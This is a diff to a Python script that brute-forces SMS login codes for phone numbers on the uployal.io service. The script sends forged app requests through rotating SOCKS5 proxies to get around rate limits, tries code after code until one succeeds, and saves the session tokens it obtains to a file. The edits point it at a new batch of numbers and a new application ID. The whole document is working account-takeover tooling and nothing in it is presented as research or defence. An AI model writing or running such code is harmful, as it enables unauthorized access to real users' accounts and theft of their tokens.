@@ -28,7 +28,7 @@ def craft_request(phone_number: str, code: str):
         "Host: uployal.io\r\n"
         "Content-Type: application/json\r\n"
         "Content-Length: " + str(content_len) + "\r\n"
-        "X-APPLICATION-ID: e81d5b756\r\n"
+        "X-APPLICATION-ID: b52d841cf\r\n"
         "User-Agent: okhttp/4.12.0\r\n"
         "\r\n"
     )
@@ -44,7 +44,7 @@ def craft_send_code_request(phone: str):
         "Host: uployal.io\r\n"
         "Content-Type: application/json\r\n"
         "Content-Length: " + str(content_len) + "\r\n"
-        "X-APPLICATION-ID: e81d5b756\r\n"
+        "X-APPLICATION-ID: b52d841cf\r\n"
         "User-Agent: okhttp/4.12.0\r\n"
         "\r\n"
     )
@@ -54,28 +54,28 @@ def craft_send_code_request(phone: str):
 
 
 async def send_auth_code(phone: str, proxy):
-    print('trying to send auth code')
+    # print('trying to send auth code')
     async_sock = await AIOSocket.open_connection(
         ADDR, ssl_context=SSL_CONTEXT, server_hostname=HOST, socks5_addr=proxy
     )
     async_sock.set_timeout(10)
     await async_sock.send(craft_send_code_request(phone))
-    print('code sent!')
+    # print('code sent!')
     res = await read_http_response(async_sock)
     return res
 
 
 async def check_one(phone, code, proxy):
     try:
-        print('trying to connect')
+        # print('trying to connect')
         async_sock = await AIOSocket.open_connection(
             ADDR, ssl_context=SSL_CONTEXT, server_hostname=HOST, socks5_addr=proxy
         )
-        print('connected, sending request')
+        # print('connected, sending request')
         async_sock.set_timeout(50)
         request = craft_request(phone, code)
         await async_sock.send(request)
-        print('connected, sent!')
+        # print('connected, sent!')
         response = await read_http_response(async_sock)
         return response
     except Exception as e:
@@ -86,7 +86,7 @@ async def check_one(phone, code, proxy):
 async def proxy_checks_codes(phone, proxy, codes):
     for code in codes:
         result = await check_one(phone, code, proxy)
-        print(code, result)
+        print(code, result.body)
         if result.status_code == 200:
             raise OK(res=result, code=code)
         await asyncio.sleep(1)
@@ -120,7 +120,7 @@ async def bruteforce(phone, proxies):
 
 
 def read_numbers():
-    with open("temp.txt", "r") as f:
+    with open("taistranew2.txt", "r") as f:
         numbers = f.read().split("\n")
         if "" in numbers:
             numbers.remove("")
@@ -136,8 +136,8 @@ async def main():
             if res.status_code == 200:
                 result = await bruteforce(phone, proxies)
                 token = result.json()["results"]["token"]
-                print("token", token)
-                with open("temp_tokens.txt", "a") as f:
+                print("token2", token)
+                with open("taistra_tokens2.txt", "a") as f:
                     f.write(f"{token}\n")
         except Exception as e:
             print("Error checking number", e)
